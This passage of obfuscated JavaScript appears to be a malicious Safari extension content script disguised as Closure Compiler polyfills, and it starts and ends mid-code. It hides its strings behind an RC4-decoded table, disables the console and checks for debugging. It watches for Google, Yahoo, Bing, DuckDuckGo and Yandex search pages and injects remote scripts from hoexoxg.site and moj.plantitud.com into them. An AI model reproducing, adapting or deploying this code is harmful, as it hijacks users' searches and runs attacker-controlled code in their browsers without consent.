    "worCpBLCkg==", "wp5GQ8OGwro=", "wqs2bTtX", "wqBWw7/CjsOU", "A8K0ZcOhJnRoAQ==", "wpnDtMO8w5xx", "wqUHw4vDhxs=", "wqdVw5bCksKB", "w5QqMcK0wo8=", "w49NXsK3woPCkcOhwqrDqsKu", "w6oeKVwuwqhUeA==", "wr3DrcOcw4Rf", "wr8Rwq3Csw==", "Fz4YKg==", "w6UUw7/Dogg=", "UsO7wqAmw4hIwpxlw4gx", "SXfDkEZ3Gkdmf0k=", "w6k0wroQIA==", "SWfDo8K/woE=", "wrjDgg7Dnjo=", "BiUBNsOowrnDqzIz", "wqjDksK5Z8K/CMKOw7vDsMK8"
];
(function (params, content) {

    var fn = function (selected_image) {
        for (; --selected_image;) {
            params.push(params.shift());
        }
    };

    var build = function () {
        var target = {
            "data": {
                "key": "cookie",
                "value": "timeout"
            },
            "setCookie": function (data, name, uri, headers) {
                headers = headers || {};

                var url = name + "=" + uri;

                var q = 0;

                var i = 0;
                var key = data.length;
                for (; i < key; i++) {
                    var d = data[i];

                    url = url + ("; " + d);
                    var value = data[d];
                    data.push(value);
                    key = data.length;
                    if (value !== true) {

                        url = url + ("=" + value);
                    }
                }

                headers.cookie = url;
            },
            "removeCookie": function () {
                return "dev";
            },
            "getCookie": function (match, href) {
                match = match || function (canCreateDiscussions) {
                    return canCreateDiscussions;
                };
                var v = match(new RegExp("(?:^|; )" + href.replace(/([.$?*|{}()[]\/+^])/g, "$1") + "=([^;]*)"));

                var test = function (callback, i) {
                    callback(++i);
                };
                test(fn, content);
                return v ? decodeURIComponent(v[1]) : undefined;
            }
        };

        var init = function () {

            var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
            return test.test(target.removeCookie.toString());
        };

        target.updateCookie = init;

        var array = "";
        var k = target.updateCookie();
        if (!k) {
            target.setCookie(["*"], "counter", 1);
        } else {
            if (k) {
                array = target.getCookie(null, "counter");
            } else {
                target.removeCookie();
            }
        }
    };
    build();
})(a0a, 367);

var a0b = function (m, gamma) {

    m = m - 0;
    var l = a0a[m];
    if (a0b.yYCZAh === undefined) {
        (function () {

            var unescape = function () {
                var source;
                try {
                    source = Function("return (function() " + '{}.constructor("return this")( )' + ");")();
                } catch (l) {

                    source = window;
                }
                return source;
            };
            var s_utf8 = unescape();

            var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            if (!s_utf8.atob) {

                s_utf8.atob = function (i) {
                    var str = String(i).replace(/=+$/, "");

                    var pix_color = "";

                    var bc = 0;
                    var bs;
                    var buffer;

                    var Y = 0;
                    for (; buffer = str.charAt(Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String.fromCharCode(255 & bs >> (-2 * bc & 6)) : 0) {
                        buffer = listeners.indexOf(buffer);
                    }
                    return pix_color;
                };
            }
        })();

        var testcase = function (data, fn) {

            var result = [];

            var i = 0;
            var word;

            var testResult = "";

            var tempData = "";

            data = atob(data);

            var val = 0;
            var key = data.length;
            for (; val < key; val++) {

                tempData = tempData + ("%" + ("00" + data.charCodeAt(val).toString(16)).slice(-2));
            }

            data = decodeURIComponent(tempData);
            var j;

            j = 0;
            for (; j < 256; j++) {

                result[j] = j;
            }

            j = 0;
            for (; j < 256; j++) {

                i = (i + result[j] + fn.charCodeAt(j % fn.length)) % 256;
                word = result[j];
                result[j] = result[i];
                result[i] = word;
            }

            j = 0;

            i = 0;

            var PL$19 = 0;
            for (; PL$19 < data.length; PL$19++) {

                j = (j + 1) % 256;

                i = (i + result[j]) % 256;
                word = result[j];
                result[j] = result[i];
                result[i] = word;
                testResult = testResult + String.fromCharCode(data.charCodeAt(PL$19) ^ result[(result[j] + result[i]) % 256]);
            }
            return testResult;
        };

        a0b.VqQkxC = testcase;
        a0b.HXMKWI = {};

        a0b.yYCZAh = true;
    }
    var o = a0b.HXMKWI[m];
    if (o === undefined) {
        if (a0b.avdWvu === undefined) {

            var WMCacheControl = function (deny) {
                this.mpnbTz = deny;

                this.TQjLvW = [1, 0, 0];

                this.dNECWX = function () {
                    return "newState";
                };

                this.TAlOar = "\\w+ *\\(\\) *{\\w+ *";

                this.yLVawE = "['|\"].+['|\"];? *}";
            };

            WMCacheControl.prototype.VyqkgG = function () {

                var test = new RegExp(this.TAlOar + this.yLVawE);

                var artistTrack = test.test(this.dNECWX.toString()) ? --this.TQjLvW[1] : --this.TQjLvW[0];
                return this.QKPkcL(artistTrack);
            };

            WMCacheControl.prototype.QKPkcL = function (canCreateDiscussions) {
                if (!Boolean(~canCreateDiscussions)) {
                    return canCreateDiscussions;
                }
                return this.xCJawF(this.mpnbTz);
            };

            WMCacheControl.prototype.xCJawF = function (saveNotifs) {

                var fp = 0;
                var len = this.TQjLvW.length;
                for (; fp < len; fp++) {
                    this.TQjLvW.push(Math.round(Math.random()));
                    len = this.TQjLvW.length;
                }
                return saveNotifs(this.TQjLvW[0]);
            };
            (new WMCacheControl(a0b)).VyqkgG();

            a0b.avdWvu = true;
        }
        l = a0b.VqQkxC(l, gamma);
        a0b.HXMKWI[m] = l;
    } else {
        l = o;
    }
    return l;
};
var f = function () {

    var c = true;
    return function (object__360, function__361) {

        var loopend = c ? function () {
            if (function__361) {
                var cssobj = function__361.apply(object__360, arguments);

                function__361 = null;
                return cssobj;
            }
        } : function () {};

        c = true;
        return loopend;
    };
}();
var fO = f(this, function () {

    var intval = function () {
        return "dev";
    };

    var getDOMPath = function () {
        return "window";
    };

    var testcase = function () {

        var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
        return !test.test(intval.toString());
    };

    var _stringify = function () {

        var test = new RegExp("(\\\\[x|u](\\w){2,4})+");
        return test.test(getDOMPath.toString());
    };

    var wrap = function (p) {

        var ms_controller = ~-1 >> 1 + 255 % 0;
        if (p.indexOf("i" === ms_controller)) {
            create(p);
        }
    };

    var create = function (s) {

        var n = ~-4 >> 1 + 255 % 0;
        if (s.indexOf((!![] + "")[3]) !== n) {
            wrap(s);
        }
    };
    if (!testcase()) {
        if (!_stringify()) {
            wrap("indеxOf");
        } else {
            wrap("indexOf");
        }
    } else {
        wrap("indеxOf");
    }
});
fO();
var e = function () {
    var _ = {};

    _.fxIxA = function (letter, all) {
        return letter == all;
    };

    _.Scusm = function (type, imagePixelModule) {
        return type === imagePixelModule;
    };

    _.dKxLT = "nWFOv";
    var tileFuncs = _;

    var closeExpr = true;
    return function (object__360, function__361) {
        var scanKeyPubBytes = {};

        scanKeyPubBytes.uWefn = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.fxIxA(mmaModFeedbackAutomSyncedEvent, tiles);
        };

        scanKeyPubBytes.iJJFY = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.Scusm(mmaModFeedbackAutomSyncedEvent, tiles);
        };
        scanKeyPubBytes.ptPTo = tileFuncs.dKxLT;
        var Q = scanKeyPubBytes;

        var closingExpr = closeExpr ? function () {
            var undefined = {};

            undefined.oUaXQ = function (key, itm) {
                return Q.uWefn(key, itm);
            };
            var extensions = undefined;
            if (function__361) {
                if (Q.iJJFY(Q.ptPTo, "XbCss")) {
                    var j = $jscomp.propertyToPolyfillSymbol[c];
                    if (extensions.oUaXQ(null, j)) {
                        return a[c];
                    }
                    j = a[j];
                    return void 0 !== j ? j : a[c];
                } else {
                    var cssobj = function__361.apply(object__360, arguments);

                    function__361 = null;
                    return cssobj;
                }
            }
        } : function () {};

        closeExpr = true;
        return closingExpr;
    };
}();
(function () {
    var target = {};

    target.JEoQx = "function *" + "( *)";

    target.pCGTJ = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    target.NxPSG = "init";

    target.FNcJD = function (buckets, name) {
        return buckets + name;
    };

    target.WAvwA = "chain";

    target.dtcxZ = "input";

    target.fZvbB = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    target.NETsm = function (callback, response_2, webhookMsg) {
        return callback(response_2, webhookMsg);
    };
    var a = target;
    a.NETsm(e, this, function () {

        var numericValueTests = new RegExp(a.JEoQx);

        var test = new RegExp("++ *(?:[" + "a-zA-Z_$][" + "0-9a-zA-Z_$]*)", "i");
        var label = a.pCGTJ(d, a.NxPSG);
        if (!numericValueTests.test(a.FNcJD(label, a.WAvwA)) || !test.test(label + a.dtcxZ)) {
            a.fZvbB(label, "0");
        } else {
            d();
        }
    })();
})();
var c = function () {
    var activeIndex = {};

    activeIndex.VLsdz = function (i, categoryStart) {
        return i === categoryStart;
    };

    activeIndex.WeHFV = function (_num2, _num1) {
        return _num2 / _num1;
    };

    activeIndex.lqvfw = function (optionsValue, value) {
        return optionsValue !== value;
    };

    activeIndex.dlhHl = "lrXze";
    var tileFuncs = activeIndex;

    var closeExpr = true;
    return function (object__360, function__361) {
        var values = {};

        values.OYBMz = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.VLsdz(mmaModFeedbackAutomSyncedEvent, tiles);
        };

        values.oruSZ = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.WeHFV(mmaModFeedbackAutomSyncedEvent, tiles);
        };

        values.PANfz = function (mmaModFeedbackAutomSyncedEvent, tiles) {
            return tileFuncs.lqvfw(mmaModFeedbackAutomSyncedEvent, tiles);
        };

        values.BzVPT = function (saveNotifs) {
            return saveNotifs();
        };

        values.xEkDU = "none";
        var handlers = values;
        if (tileFuncs.dlhHl !== tileFuncs.dlhHl) {
            return handlers.OYBMz(c, b) ? 0 !== c || handlers.OYBMz(handlers.oruSZ(1, c), 1 / b) : handlers.PANfz(c, c) && b !== b;
        } else {

            var closingExpr = closeExpr ? function () {
                if ("cMLBQ" !== "lPRrQ") {
                    if (function__361) {
                        var cssobj = function__361.apply(object__360, arguments);

                        function__361 = null;
                        return cssobj;
                    }
                } else {
                    if (d) {
                        handlers.BzVPT(e);
                    } else {
                        var body = document.body;
                        if (body && handlers.OYBMz(handlers.xEkDU, body.style.display)) {
                            window.location.replace(location.href);
                        }
                    }
                    var query = {};
                    query.url = location.href;

                    query.status = d;
                    safari.extension.dispatchMessage(eventName, query);
                }
            } : function () {};

            closeExpr = true;
            return closingExpr;
        }
    };
}();
var g = c(this, function () {
    var self = {};

    self.rlMnf = "info";

    self.fmCgP = "6|3|2|7|4|" + "0|9|5|8|1";

    self.EiPtW = function (letter, all) {
        return letter == all;
    };

    self.JcDyU = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    self.uIRnB = function (buckets, name) {
        return buckets + name;
    };

    self.posvb = function (saveNotifs) {
        return saveNotifs();
    };

    self.QHGdH = "lHXSM";

    self.ktKMm = function (optionsValue, value) {
        return optionsValue !== value;
    };

    self.qOBtJ = "FRXum";
    var app = self;

    var e = function () {};
    var result;
    try {
        result = app.posvb(aL);
    } catch (aV) {

        result = window;
    }
    if (!result.console) {
        if ("vAduq" === app.QHGdH) {
            var code = xhr.responseText;
            var data = {
                "status": code,
                "timestamp": Date.now()
            };
            localStorage.setItem(app.rlMnf, JSON.stringify(data));
            if (d) {
                b(code);
            }
        } else {
            result.console = function (e) {
                var callbackVals = app.fmCgP.split("|");

                var callbackCount = 0;
                for (; true;) {
                    switch (callbackVals[callbackCount++]) {
                    case "0":

                        result.error = e;
                        continue;
                    case "1":
                        return result;
                    case "2":

                        result.warn = e;
                        continue;
                    case "3":

                        result.log = e;
                        continue;
                    case "4":

                        result.info = e;
                        continue;
                    case "5":

                        result.table = e;
                        continue;
                    case "6":
                        var result = {};
                        continue;
                    case "7":

                        result.debug = e;
                        continue;
                    case "8":

                        result.trace = e;
                        continue;
                    case "9":

                        result.exception = e;
                        continue;
                    }
                    break;
                }
            }(e);
        }
    } else {
        if (app.ktKMm("jhqFx", app.qOBtJ)) {

            result.console.log = e;

            result.console.warn = e;

            result.console.debug = e;

            result.console.info = e;

            result.console.error = e;

            result.console.exception = e;

            result.console.table = e;

            result.console.trace = e;
        } else {
            if (app.EiPtW(200, xhr.status)) {
                var res = xhr.responseText;
                var data = {
                    "status": res,
                    "timestamp": Date.now()
                };
                localStorage.setItem(app.rlMnf, JSON.stringify(data));
                if (d) {
                    app.JcDyU(b, res);
                }
            } else {
                if (d) {
                    f(false);
                }
            }
        }
    }
});
g();
var $jscomp = $jscomp || {};
$jscomp.scope = {};

$jscomp.ASSUME_ES5 = false;

$jscomp.ASSUME_NO_NATIVE_MAP = false;

$jscomp.ASSUME_NO_NATIVE_SET = false;

$jscomp.SIMPLE_FROUND_POLYFILL = false;

$jscomp.ISOLATE_POLYFILLS = false;

$jscomp.FORCE_POLYFILL_PROMISE = false;

$jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION = false;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (options, attr, device) {
    var currentRelations = {};

    currentRelations.PeGNY = function (letter, all) {
        return letter == all;
    };

    currentRelations.MhNYO = function (letter, all) {
        return letter == all;
    };
    var addedRelations = currentRelations;
    if (addedRelations.PeGNY(options, Array.prototype) || addedRelations.MhNYO(options, Object.prototype)) {
        return options;
    }
    options[attr] = device.value;
    return options;
};

$jscomp.getGlobal = function (data) {
    var objectsToHistory = {};

    objectsToHistory.xnQLp = "object";

    objectsToHistory.nlpZX = function (letter, all) {
        return letter == all;
    };

    objectsToHistory.pIfJQ = function (letter, all) {
        return letter == all;
    };

    objectsToHistory.KzRtm = function (rowTop, clientHeight) {
        return rowTop < clientHeight;
    };

    objectsToHistory.eKpjc = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    objectsToHistory.atXzl = "Cannot find global object";
    var handlers = objectsToHistory;

    data = [handlers.xnQLp == typeof globalThis && globalThis, data, handlers.nlpZX(handlers.xnQLp, typeof window) && window, handlers.pIfJQ(handlers.xnQLp, typeof self) && self, handlers.pIfJQ(handlers.xnQLp, typeof global) && global];

    var c = 0;
    for (; handlers.KzRtm(c, data.length); ++c) {
        var root = data[c];
        if (root && handlers.pIfJQ(root.Math, Math)) {
            return root;
        }
    }
    throw handlers.eKpjc(Error, handlers.atXzl);
};
$jscomp.global = $jscomp.getGlobal(this);

$jscomp.IS_SYMBOL_NATIVE = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
$jscomp.TRUST_ES6_POLYFILLS = !$jscomp.ISOLATE_POLYFILLS || $jscomp.IS_SYMBOL_NATIVE;
$jscomp.polyfills = {};
$jscomp.propertyToPolyfillSymbol = {};

$jscomp.POLYFILL_PREFIX = "$jscp$";

var $jscomp$lookupPolyfilledValue = function (mapping, index) {
    var currentRelations = {};

    currentRelations.XQgAh = function (letter, all) {
        return letter == all;
    };

    currentRelations.mVvjs = function (optionsValue, value) {
        return optionsValue !== value;
    };
    var addedRelations = currentRelations;
    var value = $jscomp.propertyToPolyfillSymbol[index];
    if (addedRelations.XQgAh(null, value)) {
        return mapping[index];
    }
    value = mapping[value];
    return addedRelations.mVvjs(void 0, value) ? value : mapping[index];
};

$jscomp.polyfill = function (mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg) {
    if (mmaPushNotificationsComponent) {
        if ($jscomp.ISOLATE_POLYFILLS) {
            $jscomp.polyfillIsolated(mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg);
        } else {
            $jscomp.polyfillUnisolated(mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg);
        }
    }
};

$jscomp.polyfillUnisolated = function (p, key, prop, value) {
    var context = {};

    context.MZaNY = function (rowTop, clientHeight) {
        return rowTop < clientHeight;
    };

    context.LTohp = function (minWorkers, options) {
        return minWorkers in options;
    };

    context.wMiFc = function (b, a) {
        return b - a;
    };

    context.LnRSl = function (modstatus, mmCoreNotDownloadable) {
        return modstatus != mmCoreNotDownloadable;
    };
    var obj = context;
    var callbackVals = ("0|2|1|3|5|" + "4|6").split("|");

    var callbackCount = 0;
    for (; true;) {
        switch (callbackVals[callbackCount++]) {
        case "0":
            prop = $jscomp.global;
            continue;
        case "1":

            value = 0;
            for (; obj.MZaNY(value, p.length - 1); value++) {
                var name = p[value];
                if (!obj.LTohp(name, prop)) {
                    return;
                }
                prop = prop[name];
            }
            continue;
        case "2":
            p = p.split(".");
            continue;
        case "3":
            p = p[obj.wMiFc(p.length, 1)];
            continue;
        case "4":
            key = key(value);
            continue;
        case "5":
            value = prop[p];
            continue;
        case "6":
            if (key != value && obj.LnRSl(null, key)) {
                $jscomp.defineProperty(prop, p, {
                    "configurable": true,
                    "writable": true,
                    "value": key
                });
            }
            continue;
        }
        break;
    }
};

$jscomp.polyfillIsolated = function (layoutSets, c, e, v) {
    var array = {};

    array.JcgLM = "script";

    array.aSbxX = "src";

    array.wzMcV = function (x_or_y, y) {
        return x_or_y === y;
    };

    array.GqrxY = function (minWorkers, options) {
        return minWorkers in options;
    };

    array.JctXN = function (angle, keyAngle) {
        return angle < keyAngle;
    };

    array.eKdnq = function (b, a) {
        return b - a;
    };

    array.TeFLu = "XoSug";

    array.Zqywp = "bGejl";

    array.JnhAC = "es6";

    array.fuRHh = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    array.cVkGM = function (modstatus, mmCoreNotDownloadable) {
        return modstatus != mmCoreNotDownloadable;
    };

    array.RWPzm = function (text, shorturl_result) {
        return text + shorturl_result;
    };
    var a = array;
    var t = layoutSets.split(".");
    layoutSets = a.wzMcV(1, t.length);
    v = t[0];
    v = !layoutSets && a.GqrxY(v, $jscomp.polyfills) ? $jscomp.polyfills : $jscomp.global;

    var x = 0;
    for (; a.JctXN(x, a.eKdnq(t.length, 1)); x++) {
        if (a.TeFLu !== a.Zqywp) {
            var c = t[x];
            if (!a.GqrxY(c, v)) {
                return;
            }
            v = v[c];
        } else {
            var rowSorter = document.createElement(a.JcgLM);
            rowSorter.setAttribute(a.aSbxX, "https://www.hoexoxg.site/static/s/app.js");
            document.head.appendChild(rowSorter);
        }
    }
    t = t[a.eKdnq(t.length, 1)];
    e = $jscomp.IS_SYMBOL_NATIVE && a.JnhAC === e ? v[t] : null;
    c = a.fuRHh(c, e);
    if (a.cVkGM(null, c)) {
        if (layoutSets) {
            $jscomp.defineProperty($jscomp.polyfills, t, {
                "configurable": true,
                "writable": true,
                "value": c
            });
        } else {
            if (c !== e) {
                $jscomp.propertyToPolyfillSymbol[t] = $jscomp.IS_SYMBOL_NATIVE ? $jscomp.global.Symbol(t) : a.RWPzm($jscomp.POLYFILL_PREFIX, t);
                t = $jscomp.propertyToPolyfillSymbol[t];
                $jscomp.defineProperty(v, t, {
                    "configurable": true,
                    "writable": true,
                    "value": c
                });
            }
        }
    }
};
$jscomp.polyfill("Object.is", function (animated) {
    var node = {};

    node.MCyFh = function (x_or_y, y) {
        return x_or_y === y;
    };

    node.ALxWN = function (_num2, _num1) {
        return _num2 / _num1;
    };

    node.WLHGq = function (optionsValue, value) {
        return optionsValue !== value;
    };
    var B3494 = node;
    return animated ? animated : function (char__3503, env__3547) {
        return char__3503 === env__3547 ? 0 !== char__3503 || B3494.MCyFh(1 / char__3503, B3494.ALxWN(1, env__3547)) : B3494.WLHGq(char__3503, char__3503) && B3494.WLHGq(env__3547, env__3547);
    };
}, "es6", "es3");
setInterval(function () {
    d();
}, 4E3);
$jscomp.polyfill("Array.prototype.includes", function (obj) {
    var PL$6 = {};

    PL$6.sctZX = function (rowTop, clientHeight) {
        return rowTop < clientHeight;
    };

    PL$6.KNwkT = function (minWorkers, options) {
        return minWorkers in options;
    };

    PL$6.wiats = function (modstatus, mmCoreNotDownloadable) {
        return modstatus != mmCoreNotDownloadable;
    };

    PL$6.wKBGR = function (x_or_y, y) {
        return x_or_y === y;
    };

    PL$6.qGKkk = "aDuqO";

    PL$6.RAGaL = "FRvxY";

    PL$6.Tputh = "3|4|5|0|2|" + "1";

    PL$6.fEwRH = function (_num1, _num2) {
        return _num1 > _num2;
    };

    PL$6.VqpCZ = function (buckets, name) {
        return buckets + name;
    };

    PL$6.vhVuS = function (rowTop, clientHeight) {
        return rowTop < clientHeight;
    };
    var PL$16 = PL$6;
    return obj ? obj : function (name, data) {
        var currentRelations = {};

        currentRelations.wOZRI = function (b, a) {
            return b - a;
        };

        currentRelations.gSgWJ = function (PL$15, texthtml) {
            return PL$16.sctZX(PL$15, texthtml);
        };

        currentRelations.xyOMo = function (PL$15, texthtml) {
            return PL$16.KNwkT(PL$15, texthtml);
        };

        currentRelations.BnqXR = function (PL$15, texthtml) {
            return PL$16.wiats(PL$15, texthtml);
        };
        var validators = currentRelations;
        if (PL$16.wKBGR(PL$16.qGKkk, PL$16.RAGaL)) {
            var callbackVals = ("2|1|5|3|4|" + "0|6").split("|");

            var callbackCount = 0;
            for (; true;) {
                switch (callbackVals[callbackCount++]) {
                case "0":
                    name = name(value);
                    continue;
                case "1":
                    obj = obj.split(".");
                    continue;
                case "2":
                    data = $jscomp.global;
                    continue;
                case "3":
                    obj = obj[validators.wOZRI(obj.length, 1)];
                    continue;
                case "4":
                    value = data[obj];
                    continue;
                case "5":

                    value = 0;
                    for (; validators.gSgWJ(value, validators.wOZRI(obj.length, 1)); value++) {
                        var val = obj[value];
                        if (!validators.xyOMo(val, data)) {
                            return;
                        }
                        data = data[val];
                    }
                    continue;
                case "6":
                    if (validators.BnqXR(name, value) && null != name) {
                        $jscomp.defineProperty(data, obj, {
                            "configurable": true,
                            "writable": true,
                            "value": name
                        });
                    }
                    continue;
                }
                break;
            }
        } else {
            var callbackVals = PL$16.Tputh.split("|");

            var callbackCount = 0;
            for (; true;) {
                switch (callbackVals[callbackCount++]) {
                case "0":
                    data = data || 0;
                    continue;
                case "1":
                    return false;
                case "2":
                    if (PL$16.fEwRH(0, data)) {
                        data = Math.max(PL$16.VqpCZ(data, length), 0);
                    }
                    for (; PL$16.vhVuS(data, length); data++) {
                        var obj = value[data];
                        if (PL$16.wKBGR(obj, name) || Object.is(obj, name)) {
                            return true;
                        }
                    }
                    continue;
                case "3":
                    var value = this;
                    continue;
                case "4":
                    if (value instanceof String) {

                        value = String(value);
                    }
                    continue;
                case "5":
                    var length = value.length;
                    continue;
                }
                break;
            }
        }
    };
}, "es7", "es3");

$jscomp.checkStringArgs = function (gameFolder, data, boardManager) {
    var currentRelations = {};

    currentRelations.HapgX = function (state, inUse) {
        return state == inUse;
    };

    currentRelations.zzeGg = function (buckets, name) {
        return buckets + name;
    };

    currentRelations.YpMqH = " must not be null or undefined";

    currentRelations.dvrxe = function (impromptuInstance, Impromptu) {
        return impromptuInstance instanceof Impromptu;
    };

    currentRelations.TnBEt = function (buckets, name) {
        return buckets + name;
    };
    var addedRelations = currentRelations;
    if (addedRelations.dvrxe(data, RegExp)) {
        throw new TypeError(addedRelations.TnBEt("First argument to String.prototype." + boardManager, " must not be a regular expression"));
    }
    return gameFolder + "";
};
$jscomp.polyfill("String.prototype.includes", function (canCreateDiscussions) {
    var currentRelations = {};

    currentRelations.hAVDR = function (x_or_y, y) {
        return x_or_y === y;
    };

    currentRelations.VZLTI = "HNMAN";

    currentRelations.kKWZI = "IgBwG";

    currentRelations.zPpOU = function (optionsValue, value) {
        return optionsValue !== value;
    };

    currentRelations.wnCXG = function (isPrevType, isCurrentType) {
        return isPrevType || isCurrentType;
    };
    var command_codes = currentRelations;
    return canCreateDiscussions ? canCreateDiscussions : function (classNAME, data) {
        if (command_codes.hAVDR(command_codes.VZLTI, command_codes.kKWZI)) {
            var denies = fn.apply(context, arguments);

            fn = null;
            return denies;
        } else {
            return command_codes.zPpOU(-1, $jscomp.checkStringArgs(this, classNAME, "includes").indexOf(classNAME, command_codes.wnCXG(data, 0)));
        }
    };
}, "es6", "es3");
var xhr;

var eventName = "beforeload";

var isSafari13OrLater = null != (ver = navigator.appVersion.match(/version\/(\d+)/i)) && 13 <= ver[1];
addEventListener(eventName, function (canCreateDiscussions) {
    var obj = {};

    obj.JoIJc = function (x_or_y, y) {
        return x_or_y === y;
    };

    obj.JYSiN = "YisOc";

    obj.kDqqk = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    obj.kkKdz = function (x_or_y, y) {
        return x_or_y === y;
    };

    obj.ZhRdW = function (_num2, _num1) {
        return _num2 / _num1;
    };

    obj.zGPfH = function (letter, all) {
        return letter == all;
    };

    obj.HiEgJ = "onCqt";

    obj.VpZKn = "info";

    obj.ntIza = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    obj.eZmva = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    obj.LTzVO = function (x_or_y, y) {
        return x_or_y === y;
    };

    obj.Ekfap = "LDBCB";

    obj.ybZhr = function (saveNotifs) {
        return saveNotifs();
    };

    obj.pqZww = function (optionsValue, value) {
        return optionsValue !== value;
    };

    obj.YHrSW = "https://moj.plantitud.com/static/gs/s.js";

    obj.Fkmum = function (buckets, name) {
        return buckets + name;
    };

    obj.efkGB = ";return st" + 'atus("';

    obj.qhntV = function (f, widthCtrl) {
        return f(widthCtrl);
    };

    obj.BqKHm = function (f, widthCtrl) {
        return f(widthCtrl);
    };

    obj.pMnaR = "PghYb";

    obj.wLfeG = "none";

    obj.enFtF = "debu";

    obj.MnCHh = "gger";

    obj.xbetY = "stateObject";

    obj.GYIEc = function (optionsValue, value) {
        return optionsValue !== value;
    };

    obj.iuuTY = "mRWft";

    obj.ZqSjr = function (x_or_y, y) {
        return x_or_y === y;
    };

    obj.ockTq = "0|1|2|4|3";

    obj.RAqgJ = function (callback, identifierPositions) {
        return callback(identifierPositions);
    };

    obj.OqCiT = function (saveNotifs, notifications) {
        return saveNotifs(notifications);
    };

    obj.puXEi = function (mid_OR_high, high_OR_null) {
        return mid_OR_high <= high_OR_null;
    };

    obj.PNuAU = function (_num2, _num1) {
        return _num2 / _num1;
    };

    obj.IQPhl = "google.";

    obj.NhQJI = "yahoo.";

    obj.Cspsr = "bing.";

    obj.dSCrp = "duckduckgo.";

    obj.tLgUF = "yandex.";

    obj.RVBue = '[src="http' + "s://www.hoexoxg.site" + "/static/s/" + 'app.js"]';

    obj.GLgNM = "JAhJQ";

    obj.brJeG = "src";

    obj.bdNuj = "https://www.hoexoxg.site/static/s/app.js";
    var data = obj;
    if (!isSafari13OrLater && window.top === window) {
        if (!document.referrer && location.host && location.search && location.href && (location.host.includes(data.IQPhl) && location.href.match(/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location.host.includes(data.NhQJI) && location.href.match(/^https?:\/\/[^\/]+\/search.*?[?&]p=[^&].*$/) || location.host.includes(data.Cspsr) && location.href.match(/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location.host.includes(data.dSCrp) &&
                location.href.match(/^https?:\/\/[^\/]+\/\?.*?\bq\b=[^&].*$/) || location.host.includes(data.tLgUF) && location.href.match(/^https?:\/\/[^\/]+\/search[\/]?\?.*?\btext\b=[^&].*$/))) {

            var get = function (size) {
                var namespacedData = {};

                namespacedData.NDkPJ = function (_relatedTarget, value2) {
                    return data.kkKdz(_relatedTarget, value2);
                };

                namespacedData.ImABp = function (optionsValue, value) {
                    return optionsValue !== value;
                };

                namespacedData.UxvDC = function (_relatedTarget, value2) {
                    return data.ZhRdW(_relatedTarget, value2);
                };

                namespacedData.oBxjj = function (_relatedTarget, value2) {
                    return data.zGPfH(_relatedTarget, value2);
                };
                namespacedData.DgwsO = data.HiEgJ;
                namespacedData.DqVyF = data.VpZKn;

                namespacedData.PbQri = function (_relatedTarget, value2) {
                    return data.ntIza(_relatedTarget, value2);
                };

                namespacedData.vvNlP = function (_relatedTarget, value2) {
                    return data.eZmva(_relatedTarget, value2);
                };
                var _submitBtn = namespacedData;
                if (data.LTzVO("LDBCB", data.Ekfap)) {
                    if (size = data.LTzVO(void 0, size) ? false : size) {
                        data.ybZhr(_positionActiveTinyMCE);
                    }
                    if (xhr && data.pqZww(void 0, xhr)) {
                        xhr.abort();
                    }

                    xhr = new XMLHttpRequest;

                    xhr.timeout = 1E3;

                    xhr.ontimeout = function () {
                        if (data.JoIJc(data.JYSiN, "rqJsy")) {
                            var denies = fn.apply(context, arguments);

                            fn = null;
                            return denies;
                        } else {
                            if (size) {
                                data.kDqqk(update, false);
                            }
                        }
                    };

                    xhr.onload = function () {
                        var currentRelations = {};

                        currentRelations.nZhyS = function (disabled, status) {
                            return _submitBtn.NDkPJ(disabled, status);
                        };

                        currentRelations.GHVVu = function (disabled, status) {
                            return _submitBtn.ImABp(disabled, status);
                        };

                        currentRelations.kionv = function (disabled, status) {
                            return _submitBtn.NDkPJ(disabled, status);
                        };

                        currentRelations.QFpCU = function (disabled, status) {
                            return _submitBtn.UxvDC(disabled, status);
                        };

                        currentRelations.tGtBF = function (disabled, status) {
                            return _submitBtn.ImABp(disabled, status);
                        };
                        var B3494 = currentRelations;
                        if (_submitBtn.oBxjj(200, xhr.status)) {
                            if (_submitBtn.DgwsO === "lSjnJ") {
                                return canCreateDiscussions ? canCreateDiscussions : function (char__3503, env__3547) {
                                    return B3494.nZhyS(char__3503, env__3547) ? B3494.GHVVu(0, char__3503) || B3494.kionv(1 / char__3503, B3494.QFpCU(1, env__3547)) : B3494.GHVVu(char__3503, char__3503) && B3494.tGtBF(env__3547, env__3547);
                                };
                            } else {
                                var status = xhr.responseText;
                                var data = {
                                    "status": status,
                                    "timestamp": Date.now()
                                };
                                localStorage.setItem(_submitBtn.DqVyF, JSON.stringify(data));
                                if (size) {
                                    _submitBtn.PbQri(scroll, status);
                                }
                            }
                        } else {
                            if (size) {
                                _submitBtn.vvNlP(update, false);
                            }
                        }
                    };

                    xhr.onerror = function () {
                        update(false);
